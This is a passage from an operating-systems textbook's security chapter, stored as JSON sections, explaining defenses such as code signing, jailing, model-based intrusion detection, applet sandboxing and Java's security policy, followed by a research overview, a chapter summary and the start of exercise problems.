trying to track them down\r\nonce they hav e infected a computer. Below are a few guidelines for individual\r\nusers, but also some things that the industry as a whole can do to reduce the prob\u0002lem considerably.\r\nWhat can users do to avoid a virus infection? First, choose an operating sys\u0002tem that offers a high degree of security, with a strong kernel-user mode boundary\r\nand separate login passwords for each user and the system administrator. Under\r\nthese conditions, a virus that somehow sneaks in cannot infect the system binaries.\r\nAlso, make sure to install manufacturer security patches promptly.\r\nSecond, install only shrink-wrapped or downloaded software bought from a re\u0002liable manufacturer. Even this is no guarantee since there have been cases where\r\ndisgruntled employees have slipped viruses onto a commercial software product,\r\nbut it helps a lot. Downloading software from amateur Websites and bulletin\r\nboards offering too-good-to-be-true deals is risky behavior.\r\nThird, buy a good antivirus software package and use it as directed. Be sure to\r\nget regular updates from the manufacturer’s Website.\r\nFourth, do not click on URLs in messages, or attachments to email and tell\r\npeople not to send them to you. Email sent as plain ASCII text is always safe but\r\nattachments can start viruses when opened.\r\nFifth, make frequent backups of key files onto an external medium such as\r\nUSB drives or DVDs. Keep several generations of each file on a series of backup\r\nmedia. That way, if you discover a virus, you may have a chance to restore files as\r\nthey were before they were infected. Restoring yesterday’s infected file does not\r\nhelp, but restoring last week’s version might.\nSEC. 9.10 DEFENSES 693\r\nFinally, sixth, resist the temptation to download and run glitzy new free soft\u0002ware from an unknown source. Maybe there is a reason it is free—the maker\r\nwants your computer to join his zombie army. If you have virtual machine soft\u0002ware, running unknown software inside a virtual machine is safe, though.\r\nThe industry should also take the virus threat seriously and change some dan\u0002gerous practices. First, make simple operating systems. The more bells and whis\u0002tles there are, the more security holes there are. That is a fact of life.\r\nSecond, forget active content. Turn off Javascript. From a security point of\r\nview, it is a disaster. Viewing a document someone sends you should not require\r\nyour running their program. JPEG files, for example, do not contain programs, and\r\nthus cannot contain viruses. All documents should work like that.\r\nThird, there should be a way to selectively write protect specified disk cylin\u0002ders to prevent viruses from infecting the programs on them. This protection could\r\nbe implemented by having a bitmap inside the controller listing the write-protected\r\ncylinders. The map should only be alterable when the user has flipped a mechani\u0002cal toggle switch on the computer’s front panel.\r\nFourth, keeping the BIOS in flash memory is a nice idea, but it should only be\r\nmodifiable when an external toggle switch has been flipped, something that will\r\nhappen only when the user is consciously installing a BIOS update. Of course,\r\nnone of this will be taken seriously until a really big virus hits. For example, one\r\nthat hits the financial world and resets all bank accounts to 0. Of course, by then it\r\nwill be too late."
          },
          "9.10.3 Code Signing": {
            "page": 724,
            "content": "9.10.3 Code Signing\r\nA completely different approach to keeping out malware (remember: defense\r\nin depth) is to run only unmodified software from reliable software vendors. One\r\nissue that comes up fairly quickly is how the user can know the software came\r\nfrom the vendor it is said to have come from and how the user can know it has not\r\nbeen modified since leaving the factory. This issue is especially important when\r\ndownloading software from online stores of unknown reputation or when down\u0002loading activeX controls from Websites. If the activeX control came from a well\u0002known software company, it is unlikely to contain a Trojan horse, for example, but\r\nhow can the user be sure?\r\nOne way that is in widespread use is the digital signature, as described in\r\nSec. 9.5.4. If the user runs only programs, plugins, drivers, activeX controls, and\r\nother kinds of software that were written and signed by trusted sources, the\r\nchances of getting into trouble are much less. The consequence of doing this, how\u0002ev er, is that the new free, nifty, splashy game from Snarky Software is probably too\r\ngood to be true and will not pass the signature test since you do not know who is\r\nbehind it.\r\nCode signing is based on public-key cryptography. A software vendor gener\u0002ates a (public key, private key) pair, making the former key public and zealously\n694 SECURITY CHAP. 9\r\nguarding the latter. In order to sign a piece of software, the vendor first computes a\r\nhash function of the code to get a 160-bit or 256-bit number, depending on whether\r\nSHA-1 or SHA-256 is used. It then signs the hash value by encrypting it with its\r\nprivate key (actually, decrypting it using the notation of Fig. 9-15). This signature\r\naccompanies the software wherever it goes.\r\nWhen the user gets the software, the hash function is applied to it and the re\u0002sult saved. It then decrypts the accompanying signature using the vendor’s public\r\nkey and compares what the vendor claims the hash function is with what it just\r\ncomputed itself. If they agree, the code is accepted as genuine. Otherwise it is re\u0002jected as a forgery. The mathematics involved makes it exceedingly difficult for\r\nanyone to tamper with the software in such a way that its hash function will match\r\nthe hash function obtained by decrypting the genuine signature. It is equally dif\u0002ficult to generate a new false signature that matches without having the private key.\r\nThe process of signing and verifying is illustrated in Fig. 9-35.\r\nSoftware vendor\r\nSignature generation\r\nH = hash(Program)\r\nSignature = encrypt(H)\r\nProgram\r\nSignature\r\nUser\r\nProgram\r\nSignature\r\nInternet\r\nSignature verification\r\nH1 = hash(Program)\r\nH2 = decrypt(Signature)\r\nAccept Program if H1 = H2\r\nFigure 9-35. How code signing works.\r\nWeb pages can contain code, such as activeX controls, but also code in various\r\nscripting languages. Often these are signed, in which case the browser automat\u0002ically examines the signature. Of course, to verify it, the browser needs the soft\u0002ware vendor’s public key, which normally accompanies the code along with a cer\u0002tificate signed by some CA vouching for the authenticity of the public key. If the\r\nbrowser has the CA’s public key already stored, it can verify the certificate on its\r\nown. If the certificate is signed by a CA unknown to the browser, it will pop up a\r\ndialog box asking whether to accept the certificate or not."
          },
          "9.10.4 Jailing": {
            "page": 725,
            "content": "9.10.4 Jailing\r\nAn old Russian saying is: ‘‘Trust but Verify.’’ Clearly, the old Russian who said\r\nthis for the first time had software in mind. Even though a piece of software has\r\nbeen signed, a good attitude is to verify that it is behaving correctly nonetheless as\nSEC. 9.10 DEFENSES 695\r\nthe signature merely proves where it came from, not what it does. A technique for\r\ndoing this is called jailing and illustrated in Fig. 9-36.\r\nKernel\r\nJailer Prisoner\r\nSys\r\nFigure 9-36. The operation of a jail.\r\nThe newly acquired program is run as a process labeled ‘‘prisoner’’ in the fig\u0002ure. The ‘‘jailer’’ is a trusted (system) process that monitors the behavior of the\r\nprisoner. When a jailed process makes a system call, instead of the system call\r\nbeing executed, control is transferred to the jailer (via a kernel trap) and the system\r\ncall number and parameters passed to it. The jailer then makes a decision about\r\nwhether the system call should be allowed. If the jailed process tries to open a net\u0002work connection to a remote host unknown to the jailer, for example, the call can\r\nbe refused and the prisoner killed. If the system call is acceptable, the jailer so\r\ninforms the kernel, which then carries it out. In this way, erroneous behavior can\r\nbe caught before it causes trouble.\r\nVarious implementations of jailing exist. One that works on almost any UNIX\r\nsystem, without modifying the kernel, is described by Van ’t Noordende et al.\r\n(2007). In a nutshell, the scheme uses the normal UNIX debugging facilities, with\r\nthe jailer being the debugger and the prisoner being the debuggee. Under these cir\u0002cumstances, the debugger can instruct the kernel to encapsulate the debuggee and\r\npass all of its system calls to it for inspection."
          },
          "9.10.5 Model-Based Intrusion Detection": {
            "page": 726,
            "content": "9.10.5 Model-Based Intrusion Detection\r\nYet another approach to defending a machine is to install an IDS (Intrusion\r\nDetection System). There are two basic kinds of IDSes, one focused on inspect\u0002ing incoming network packets and one focused on looking for anomalies on the\r\nCPU. We briefly mentioned the network IDS in the context of firewalls earlier;\r\nnow we will say a few words about a host-based IDS. Space limitations prevent us\r\nfrom surveying the many kinds of host-based IDSes. Instead, we will briefly sketch\r\none type to give an idea of how they work. This one is called static model-based\r\nintrusion detection (Hua et al., 2009). It can be implemented using the jailing\r\ntechnique discussed above, among other ways.\n696 SECURITY CHAP. 9\r\nIn Fig. 9-37(a) we see a small program that opens a file called data and reads it\r\none character at a time until it hits a zero byte, at which time it prints the number\r\nof nonzero bytes at the start of the file and exits. In Fig. 9-37(b) we see a graph of\r\nthe system calls made by this program (where print calls wr ite).\r\nint main(int argc char argv[])\r\n{\r\nint fd, n = 0;\r\nchar buf[1];\r\nfd = open(\"data\", 0);\r\nif (fd < 0) {\r\nprintf(\"Bad data file\\n\");\r\nexit(1);\r\n} else {\r\nwhile (1) {\r\nread(fd, buf, 1);\r\nif (buf[0] == 0) {\r\nclose(fd);\r\nprintf(\"n = %d\\n\", n);\r\nexit(0);\r\n}\r\nn = n + 1;\r\n}\r\n}\r\n}\r\n(a)\r\nexit\r\nexit\r\nwrite\r\nwrite\r\nopen\r\nclose\r\nread\r\n(b)\r\n *\r\nFigure 9-37. (a) A program. (b) System-call graph for (a).\r\nWhat does this graph tell us? For one thing, the first system call the program\r\nmakes, under all conditions, is always open. The next one is either read or wr ite,\r\ndepending on which branch of the if statement is taken. If the second call is wr ite,\r\nit means the file could not be opened and the next call must be exit. If the second\r\ncall is read, there may be an arbitrarily large number of additional calls to read and\r\nev entually calls to close, wr ite, and exit. In the absence of an intruder, no other se\u0002quences are possible. If the program is jailed, the jailer will see all the system calls\r\nand can easily verify that the sequence is valid.\r\nNow suppose someone finds a bug in this program and manages to trigger a\r\nbuffer overflow and inserts and executes hostile code. When the hostile code runs,\r\nit will most likely execute a different sequence of system calls. For example, it\r\nmight try to open some file it wants to copy or it might open a network connection\r\nto phone home. On the very first system call that does not fit the pattern, the jailer\r\nknows definitively that there has been an attack and can take action, such as killing\r\nthe process and alerting the system administrator. In this manner, intrusion detec\u0002tion systems can detect attacks while they are going on. Static analysis of system\r\ncalls is just one of the many ways an IDS can work.\nSEC. 9.10 DEFENSES 697\r\nWhen this kind of static model-based intrusion detection is used, the jailer has\r\nto know the model (i.e., the system-call graph). The most straightforward way for\r\nit to learn it is to have the compiler generate it and have the author of the program\r\nsign it and attach its certificate. In this way, any attempt to modify the executable\r\nprogram in advance will be detected when it is run because the actual behavior will\r\nnot agree with the signed expected behavior.\r\nUnfortunately, it is possible for a clever attacker to launch what is called a\r\nmimicry attack, in which the inserted code makes the same system calls as the\r\nprogram is supposed to, so more sophisticated models are needed than just tracking\r\nsystem calls. Still, as part of defense in depth, an IDS can play a role.\r\nA model-based IDS is not the only kind, by any means. Many IDSes make use\r\nof a concept called a honeypot, a trap set to attract and catch crackers and mal\u0002ware. Usually it is an isolated machine with few defenses and a seemingly inter\u0002esting and valuable content, ripe for the picking. The people who set the honeypot\r\ncarefully monitor any attacks on it to try to learn more about the nature of the at\u0002tack. Some IDSes put their honeypots in virtual machines to prevent damage to the\r\nunderlying actual system. So naturally, the malware tries to determine if it is run\u0002ning in a virtual machine, as discussed above."
          },
          "9.10.6 Encapsulating Mobile Code": {
            "page": 728,
            "content": "9.10.6 Encapsulating Mobile Code\r\nViruses and worms are programs that get onto a computer without the owner’s\r\nknowledge and against the owner’s will. Sometimes, however, people more-or-less\r\nintentionally import and run foreign code on their machines. It usually happens\r\nlike this. In the distant past (which, in the Internet world, means a few years ago),\r\nmost Web pages were just static HTML files with a few associated images. Now\u0002adays, increasingly many Web pages contain small programs called applets.\r\nWhen a Web page containing applets is downloaded, the applets are fetched and\r\nexecuted. For example, an applet might contain a form to be filled out, plus\r\ninteractive help in filling it out. When the form is filled out, it could be sent some\u0002where over the Internet for processing. Tax forms, customized product order forms,\r\nand many other kinds of forms could benefit from this approach.\r\nAnother example in which programs are shipped from one machine to another\r\nfor execution on the destination machine are agents. These are programs that are\r\nlaunched by a user to perform some task and then report back. For example, an\r\nagent could be asked to check out some travel Websites to find the cheapest flight\r\nfrom Amsterdam to San Francisco. Upon arriving at each site, the agent would run\r\nthere, get the information it needs, then move on to the next Website. When it was\r\nall done, it could come back home and report what it had learned.\r\nA third example of mobile code is a PostScript file that is to be printed on a\r\nPostScript printer. A PostScript file is actually a program in the PostScript pro\u0002gramming language that is executed inside the printer. It normally tells the printer\n698 SECURITY CHAP. 9\r\nto draw certain curves and then fill them in, but it can do anything else it wants to\r\nas well. Applets, agents, and PostScript files are just three examples of mobile\r\ncode, but there are many others.\r\nGiven the long discussion about viruses and worms earlier, it should be clear\r\nthat allowing foreign code to run on your machine is more than a wee bit risky.\r\nNevertheless, some people do want to run these foreign programs, so the question\r\narises: ‘‘Can mobile code be run safely’’? The short answer is: ‘‘Yes, but not easi\u0002ly.’’ The fundamental problem is that when a process imports an applet or other\r\nmobile code into its address space and runs it, that code is running as part of a\r\nvalid user process and has all the power the user has, including the ability to read,\r\nwrite, erase, or encrypt the user’s disk files, email data to far-away countries, and\r\nmuch more.\r\nLong ago, operating systems developed the process concept to build walls be\u0002tween users. The idea is that each process has its own protected address space and\r\nits own UID, allowing it to touch files and other resources belonging to it, but not\r\nto other users. For providing protection against one part of the process (the applet)\r\nand the rest, the process concept does not help. Threads allow multiple threads of\r\ncontrol within a process, but do nothing to protect one thread against another one.\r\nIn theory, running each applet as a separate process helps a little, but is often\r\ninfeasible. For example, a Web page may contain two or more applets that interact\r\nwith each other and with the data on the Web page. The Web browser may also\r\nneed to interact with the applets, starting and stopping them, feeding them data,\r\nand so on. If each applet is put in its own process, the whole thing will not work.\r\nFurthermore, putting an applet in its own address space does not make it any\r\nharder for the applet to steal or damage data. If anything, it is easier since nobody\r\nis watching in there.\r\nVarious new methods of dealing with applets (and mobile code in general)\r\nhave been proposed and implemented. Below we will look at two of these meth\u0002ods: sandboxing and interpretation. In addition, code signing can also be used to\r\nverify the source of the applet. Each one has its own strengths and weaknesses.\r\nSandboxing\r\nThe first method, called sandboxing, confines each applet to a limited range of\r\nvirtual addresses enforced at run time (Wahbe et al., 1993). It works by dividing\r\nthe virtual address space up into equal-size regions, which we will call sandboxes.\r\nEach sandbox must have the property that all of its addresses share some string of\r\nhigh-order bits. For a 32-bit address space, we could divide it up into 256 sand\u0002boxes on 16-MB boundaries so that all addresses within a sandbox have a common\r\nupper 8 bits. Equally well, we could have 512 sandboxes on 8-MB boundaries,\r\nwith each sandbox having a 9-bit address prefix. The sandbox size should be cho\u0002sen to be large enough to hold the largest applet without wasting too much virtual\r\naddress space. Physical memory is not an issue if demand paging is present, as it\nSEC. 9.10 DEFENSES 699\r\nusually is. Each applet is given two sandboxes, one for the code and one for the\r\ndata, as illustrated in Fig. 9-38(a) for the case of 16 sandboxes of 16 MB each.\r\n(a) (b)\r\n256\r\n224\r\n192\r\n160\r\n128\r\n96\r\n64\r\n32\r\n0\r\nRef. Mon.\r\nCode 1\r\nData 1\r\nCode 2\r\nData 2\r\nReference\r\nmonitor for\r\nchecking\r\nsystem\r\nApplet 2\r\nApplet 1\r\nMOV R1, S1\r\nSHR #24, S1\r\nCMP S1, S2\r\nTRAPNE\r\nJMP (R1)\r\nVirual\r\naddress\r\nin MB\r\nFigure 9-38. (a) Memory divided into 16-MB sandboxes. (b) One way of\r\nchecking an instruction for validity.\r\nThe basic idea behind a sandbox is to guarantee that an applet cannot jump to\r\ncode outside its code sandbox or reference data outside its data sandbox. The rea\u0002son for having two sandboxes is to prevent an applet from modifying its code dur\u0002ing execution to get around these restrictions. By preventing all stores into the\r\ncode sandbox, we eliminate the danger of self-modifying code. As long as an\r\napplet is confined this way, it cannot damage the browser or other applets, plant vi\u0002ruses in memory, or otherwise do any damage to memory.\r\nAs soon as an applet is loaded, it is relocated to begin at the start of its sand\u0002box. Then checks are made to see if code and data references are confined to the\r\nappropriate sandbox. In the discussion below, we will just look at code references\r\n(i.e., JMP and CALL instructions), but the same story holds for data references as\r\nwell. Static JMP instructions that use direct addressing are easy to check: does the\r\ntarget address land within the boundaries of the code sandbox? Similarly, relative\r\nJMPs are also easy to check. If the applet has code that tries to leave the code\r\nsandbox, it is rejected and not executed. Similarly, attempts to touch data outside\r\nthe data sandbox cause the applet to be rejected.\r\nThe hard part is dynamic JMP instructions. Most machines have an instruction\r\nin which the address to jump to is computed at run time, put in a register, and then\r\njumped to indirectly, for example by JMP (R1) to jump to the address held in regis\u0002ter 1. The validity of such instructions must be checked at run time. This is done\r\nby inserting code directly before the indirect jump to test the target address. An\n700 SECURITY CHAP. 9\r\nexample of such a test is shown in Fig. 9-38(b). Remember that all valid addresses\r\nhave the same upper k bits, so this prefix can be stored in a scratch register, say S2.\r\nSuch a register cannot be used by the applet itself, which may require rewriting it\r\nto avoid this register.\r\nThe code works as follows: First the target address under inspection is copied\r\nto a scratch register, S1. Then this register is shifted right precisely the correct\r\nnumber of bits to isolate the common prefix in S1. Next the isolated prefix is com\u0002pared to the correct prefix initially loaded into S2. If they do not match, a trap oc\u0002curs and the applet is killed. This code sequence requires four instructions and two\r\nscratch registers.\r\nPatching the binary program during execution requires some work, but it is\r\ndoable. It would be simpler if the applet were presented in source form and then\r\ncompiled locally using a trusted compiler that automatically checked the static ad\u0002dresses and inserted code to verify the dynamic ones during execution. Either way,\r\nthere is some run-time overhead associated with the dynamic checks. Wahbe et al.\r\n(1993) have measured this as about 4%, which is generally acceptable.\r\nA second problem that must be solved is what happens when an applet tries to\r\nmake a system call. The solution here is straightforward. The system-call instruc\u0002tion is replaced by a call to a special module called a reference monitor on the\r\nsame pass that the dynamic address checks are inserted (or, if the source code is\r\navailable, by linking with a special library that calls the reference monitor instead\r\nof making system calls). Either way, the reference monitor examines each at\u0002tempted call and decides if it is safe to perform. If the call is deemed acceptable,\r\nsuch as writing a temporary file in a designated scratch directory, the call is allow\u0002ed to proceed. If the call is known to be dangerous or the reference monitor cannot\r\ntell, the applet is killed. If the reference monitor can tell which applet called it, a\r\nsingle reference monitor somewhere in memory can handle the requests from all\r\napplets. The reference monitor normally learns about the permissions from a con\u0002figuration file.\r\nInterpretation\r\nThe second way to run untrusted applets is to run them interpretively and not\r\nlet them get actual control of the hardware. This is the approach used by Web\r\nbrowsers. Web page applets are commonly written in Java, which is a normal pro\u0002gramming language, or in a high-level scripting language such as safe-TCL or\r\nJavascript. Java applets are first compiled to a virtual stack-oriented machine lan\u0002guage called JVM (Java Virtual Machine). It is these JVM applets that are put\r\non the Web page. When they are downloaded, they are inserted into a JVM inter\u0002preter inside the browser as illustrated in Fig. 9-39.\r\nThe advantage of running interpreted code over compiled code is that every in\u0002struction is examined by the interpreter before being executed. This gives the inter\u0002preter the opportunity to check if the address is valid. In addition, system calls are\nSEC. 9.10 DEFENSES 701\r\nUntrusted applet\r\nTrusted applet\r\nWeb browser\r\nSandbox\r\nInterpreter\r\nVirtual address space 0xFFFFFFFF\r\n0\r\nFigure 9-39. Applets can be interpreted by a Web browser.\r\nalso caught and interpreted. How these calls are handled is a matter of the security\r\npolicy. For example, if an applet is trusted (e.g., it came from the local disk), its\r\nsystem calls could be carried out without question. However, if an applet is not\r\ntrusted (e.g., it came in over the Internet), it could be put in what is effectively a\r\nsandbox to restrict its behavior.\r\nHigh-level scripting languages can also be interpreted. Here no machine ad\u0002dresses are used, so there is no danger of a script trying to access memory in an\r\nimpermissible way. The downside of interpretation in general is that it is very slow\r\ncompared to running native compiled code.\r\n9.10.7 Jav a Security\r\nThe Java programming language and accompanying run-time system were de\u0002signed to allow a program to be written and compiled once and then shipped over\r\nthe Internet in binary form and run on any machine supporting Java. Security was a\r\npart of the Java design from the beginning. In this section we will describe how it\r\nworks.\r\nJava is a type-safe language, meaning that the compiler will reject any attempt\r\nto use a variable in a way not compatible with its type. In contrast, consider the\r\nfollowing C code:\r\nnaughty func( )\r\n{\r\nchar *p;\r\np = rand( );\r\n*p = 0;\r\n}\r\nIt generates a random number and stores it in the pointer p. Then it stores a 0 byte\r\nat the address contained in p, overwriting whatever was there, code or data. In"
          },
          "9.10.7 Java Security": {
            "page": 732,
            "content": "SEC. 9.10 DEFENSES 701\r\nUntrusted applet\r\nTrusted applet\r\nWeb browser\r\nSandbox\r\nInterpreter\r\nVirtual address space 0xFFFFFFFF\r\n0\r\nFigure 9-39. Applets can be interpreted by a Web browser.\r\nalso caught and interpreted. How these calls are handled is a matter of the security\r\npolicy. For example, if an applet is trusted (e.g., it came from the local disk), its\r\nsystem calls could be carried out without question. However, if an applet is not\r\ntrusted (e.g., it came in over the Internet), it could be put in what is effectively a\r\nsandbox to restrict its behavior.\r\nHigh-level scripting languages can also be interpreted. Here no machine ad\u0002dresses are used, so there is no danger of a script trying to access memory in an\r\nimpermissible way. The downside of interpretation in general is that it is very slow\r\ncompared to running native compiled code.\r\n9.10.7 Jav a Security\r\nThe Java programming language and accompanying run-time system were de\u0002signed to allow a program to be written and compiled once and then shipped over\r\nthe Internet in binary form and run on any machine supporting Java. Security was a\r\npart of the Java design from the beginning. In this section we will describe how it\r\nworks.\r\nJava is a type-safe language, meaning that the compiler will reject any attempt\r\nto use a variable in a way not compatible with its type. In contrast, consider the\r\nfollowing C code:\r\nnaughty func( )\r\n{\r\nchar *p;\r\np = rand( );\r\n*p = 0;\r\n}\r\nIt generates a random number and stores it in the pointer p. Then it stores a 0 byte\r\nat the address contained in p, overwriting whatever was there, code or data. In\n702 SECURITY CHAP. 9\r\nJava, constructions that mix types like this are forbidden by the grammar. In addi\u0002tion, Java has no pointer variables, casts, or user-controlled storage allocation (such\r\nas malloc and free), and all array references are checked at run time.\r\nJava programs are compiled to an intermediate binary code called JVM (Java\r\nVirtual Machine) byte code. JVM has about 100 instructions, most of which\r\npush objects of a specific type onto the stack, pop them from the stack, or combine\r\ntwo items on the stack arithmetically. These JVM programs are typically inter\u0002preted, although in some cases they can be compiled into machine language for\r\nfaster execution. In the Java model, applets sent over the Internet are in JVM.\r\nWhen an applet arrives, it is run through a JVM byte code verifier that checks\r\nif the applet obeys certain rules. A properly compiled applet will automatically\r\nobey them, but there is nothing to prevent a malicious user from writing a JVM\r\napplet in JVM assembly language. The checks include\r\n1. Does the applet attempt to forge pointers?\r\n2. Does it violate access restrictions on private-class members?\r\n3. Does it try to use a variable of one type as another type?\r\n4. Does it generate stack overflows or underflows?\r\n5. Does it illegally convert variables of one type to another?\r\nIf the applet passes all the tests, it can be safely run without fear that it will access\r\nmemory other than its own.\r\nHowever, applets can still make system calls by calling Java methods (proce\u0002dures) provided for that purpose. The way Java deals with that has evolved over\r\ntime. In the first version of Java, JDK (Java Dev elopment Kit) 1.0. applets were\r\ndivided into two classes: trusted and untrusted. Applets fetched from the local disk\r\nwere trusted and allowed to make any system calls they wanted. In contrast, app\u0002lets fetched over the Internet were untrusted. They were run in a sandbox, as\r\nshown in Fig. 9-39, and allowed to do practically nothing.\r\nAfter some experience with this model, Sun decided that it was too restrictive.\r\nIn JDK 1.1, code signing was employed. When an applet arrived over the Internet,\r\na check was made to see if it was signed by a person or organization the user trust\u0002ed (as defined by the user’s list of trusted signers). If so, the applet was allowed to\r\ndo whatever it wanted. If not, it was run in a sandbox and severely restricted.\r\nAfter more experience, this proved unsatisfactory as well, so the security\r\nmodel was changed again. JDK 1.2 introduced a configurable fine-grain security\r\npolicy that applies to all applets, both local and remote. The security model is com\u0002plicated enough that an entire book has been written describing it (Gong, 1999), so\r\nwe will just briefly summarize some of the highlights.\r\nEach applet is characterized by two things: where it came from and who signed\r\nit. Where it came from is its URL; who signed it is which private key was used for\r\nthe signature. Each user can create a security policy consisting of a list of rules.\nSEC. 9.10 DEFENSES 703\r\nEach rule may list a URL, a signer, an object, and an action that the applet may\r\nperform on the object if the applet’s URL and signer match the rule. Conceptually,\r\nthe information provided is shown in the table of Fig. 9-40, although the actual for\u0002matting is different and is related to the Java class hierarchy.\r\nURL Signer Object Action\r\nwww.taxprep.com TaxPrep /usr/susan/1040.xls Read\r\n* /usr/tmp/* Read, Write\r\nwww.microsoft.com Microsoft /usr/susan/Office/– Read, Write, Delete\r\nFigure 9-40. Some examples of protection that can be specified with JDK 1.2.\r\nOne kind of action permits file access. The action can specify a specific file or\r\ndirectory, the set of all files in a given directory, or the set of all files and direc\u0002tories recursively contained in a given directory. The three lines of Fig. 9-40 corre\u0002spond to these three cases. In the first line, the user, Susan, has set up her permis\u0002sions file so that applets originating at her tax preparer’s machine, which is called\r\nwww.taxprep.com, and signed by the company, hav e read access to her tax data lo\u0002cated in the file 1040.xls. This is the only file they can read and no other applets\r\ncan read this file. In addition, all applets from all sources, whether signed or not,\r\ncan read and write files in /usr/tmp.\r\nFurthermore, Susan also trusts Microsoft enough to allow applets originating at\r\nits site and signed by Microsoft to read, write, and delete all the files below the\r\nOffice directory in the directory tree, for example, to fix bugs and install new ver\u0002sions of the software. To verify the signatures, Susan must either have the neces\u0002sary public keys on her disk or must acquire them dynamically, for example in the\r\nform of a certificate signed by a company she trusts and whose public key she has.\r\nFiles are not the only resources that can be protected. Network access can also\r\nbe protected. The objects here are specific ports on specific computers. A com\u0002puter is specified by an IP address or DNS name; ports on that machine are speci\u0002fied by a range of numbers. The possible actions include asking to connect to the\r\nremote computer and accepting connections originated by the remote computer. In\r\nthis way, an applet can be given network access, but restricted to talking only to\r\ncomputers explicitly named in the permissions list. Applets may dynamically load\r\nadditional code (classes) as needed, but user-supplied class loaders can precisely\r\ncontrol on which machines such classes may originate. Numerous other security\r\nfeatures are also present."
          }
        }
      },
      "9.11 RESEARCH ON SECURITY": {
        "page": 734,
        "content": "9.11 RESEARCH ON SECURITY\r\nComputer security is an extremely hot topic. Research is taking place in all\r\nareas: cryptography, attacks, malware, defenses, compilers, etc. A more-or-less\r\ncontinuous stream of high-profile security incidents ensures that research interest\n704 SECURITY CHAP. 9\r\nin security, both in academia and in industry, is not likely to wav er in the next few\r\nyears either.\r\nOne important topic is the protection of binary programs. Control Flow Integ\u0002rity (CFI) is a fairly old technique to stop all control flow div ersions and, hence, all\r\nROP exploits. Unfortunately, the overhead is very high. Since ASLR, DEP, and\r\ncanaries are not cutting it, much recent work is devoted to making CFI practical.\r\nFor instance, Zhang and Sekar (2013) at Stony Brook developed an efficient imple\u0002mentation of CFI for Linux binaries. A different group devised a different and even\r\nmore powerful implementation for Windows (Zhang, 2013b). Other research has\r\ntried to detect buffer overflows even earlier, at the moment of the overflow rather\r\nthan at the attempted control flow div ersion (Slowinska et al., 2012). Detecting the\r\noverflow itself has one major advantage. Unlike most other approaches, it allows\r\nthe system to detect attacks that modify noncontrol data also. Other tools provide\r\nsimilar protection at compile time. A popular example is Google’s Ad\u0002dressSanitizer (Serebryany, 2013). If any of these techniques becomes widely de\u0002ployed, we will have to add another paragraph to the arms race described in the\r\nbuffer overflow section.\r\nOne of the hot topics in cryptography these days is homomorphic encryption.\r\nIn laymen’s terms: homomorphic encryption allows one to process (add, subtract,\r\netc.) encrypted data while they are encrypted. In other words, the data are never\r\nconverted to plaintext. A study into the limits of provable security for homomor\u0002phic encryption was conducted by Bogdanov and Lee (2013).\r\nCapabilities and access control are also still very active research areas. A good\r\nexample of a microkernel supporting capabilities is the seL4 kernel (Klein et al.,\r\n2009). Incidentally, this is also a fully verified kernel which provides additional se\u0002curity. Capabilities have now become hot in UNIX also. Robert Watson et al.\r\n(2013) have implemented lightweight capabilities to FreeBSD.\r\nFinally, there is large body of work on exploitation techniques and malware.\r\nFor instance, Hund et al. (2013) show a practical timing channel attack to defeat\r\naddress-space randomization in the Windows kernel. Likewise Snow et al. (2013)\r\nshow that JavaScript address space randomization in the browser does not help as\r\nlong as the attacker finds a memory disclosure that leaks even a single gadget.\r\nRegarding malware, a recent study by Rossow et al. (2013) analyzes an alarming\r\ntrend in the resilience of botnets. It seems that especially botnets based on peer-to\u0002peer communication will be exceedingly hard to dismantle in the near future. Some\r\nof these botnets have been operational, nonstop, for over fiv e years."
      },
      "9.12 SUMMARY": {
        "page": 735,
        "content": "9.12 SUMMARY\r\nComputers frequently contain valuable and confidential data, including tax re\u0002turns, credit card numbers, business plans, trade secrets, and much more. The own\u0002ers of these computers are usually quite keen on having them remain private and\nSEC. 9.12 SUMMARY 705\r\nnot tampered with, which rapidly leads to the requirement that operating systems\r\nmust provide good security. In general, the security of a system is inversely propor\u0002tional to the size of the trusted computing base.\r\nA fundamental component of security for operating systems concerns access\r\ncontrol to resources. Access rights to information can be modeled as a big matrix,\r\nwith the rows being the domains (users) and the columns being the objects (e.g.,\r\nfiles). Each cell specifies the access rights of the domain to the object. Since the\r\nmatrix is sparse, it can be stored by row, which becomes a capability list saying\r\nwhat that domain can do, or by column, in which case it becomes an access control\r\nlist telling who can access the object and how. Using formal modeling techniques,\r\ninformation flow in a system can be modeled and limited. However, sometimes it\r\ncan still leak out using covert channels, such as modulating CPU usage.\r\nOne way to keep information secret is to encrypt it and manage the keys care\u0002fully. Cryptographic schemes can be categorized as secret key or public key. A\r\nsecret-key method requires the communicating parties to exchange a secret key in\r\nadvance, using some out-of-band mechanism. Public-key cryptography does not\r\nrequire secretly exchanging a key in advance, but it is much slower in use. Some\u0002times it is necessary to prove the authenticity of digital information, in which case\r\ncryptographic hashes, digital signatures, and certificates signed by a trusted certifi\u0002cation authority can be used.\r\nIn any secure system users must be authenticated. This can be done by some\u0002thing the user knows, something the user has, or something the user is (biometrics).\r\nTw o-factor identification, such as an iris scan and a password, can be used to\r\nenhance security.\r\nMany kinds of bugs in the code can be exploited to take over programs and\r\nsystems. These include buffer overflows, format string attacks, dangling pointer at\u0002tacks, return to libc attacks, null pointer dereference attacks, integer overflow at\u0002tacks, command injection attacks, and TOCTOUs. Likewise, there are many count\u0002er measures that try to prevent such exploits. Examples include stack canaries, data\r\nexecution prevention, and address-space layout randomization.\r\nInsiders, such as company employees, can defeat system security in a variety\r\nof ways. These include logic bombs set to go off on some future date, trap doors to\r\nallow the insider unauthorized access later, and login spoofing.\r\nThe Internet is full of malware, including Trojan horses, viruses, worms, spy\u0002ware, and rootkits. Each of these poses a threat to data confidentiality and integrity.\r\nWorse yet, a malware attack may be able to take over a machine and turn it into a\r\nzombie which sends spam or is used to launch other attacks. Many of the attacks\r\nall over the Internet are done by zombie armies under control of a remote botmas\u0002ter.\r\nFortunately, there are a number of ways systems can defend themselves. The\r\nbest strategy is defense in depth, using multiple techniques. Some of these include\r\nfirewalls, virus scanners, code signing, jailing, and intrusion detection systems, and\r\nencapsulating mobile code.\n706 SECURITY CHAP. 9\r\nPROBLEMS\r\n1. Confidentiality, integrity, and availability are three components of security. Describe\r\nan application that integrity and availability but not confidentiality, an application that\r\nrequires confidentiality and integrity but not (high) availability, and an application that\r\nrequires confidentiality, integrity, and availability\r\n2. One of the techniques to build a secure operating system is to minimize the size of\r\nTCB. Which of the following functions needs to be implemented inside the TCB and\r\nwhich can be implemented outside TCB: (a) Process context switch; (b) Read a file\r\nfrom disk; (c) Add more swapping space; (d) Listen to music; (e) Get the GPS coordi\u0002nates of a smartphone.\r\n3. What is a 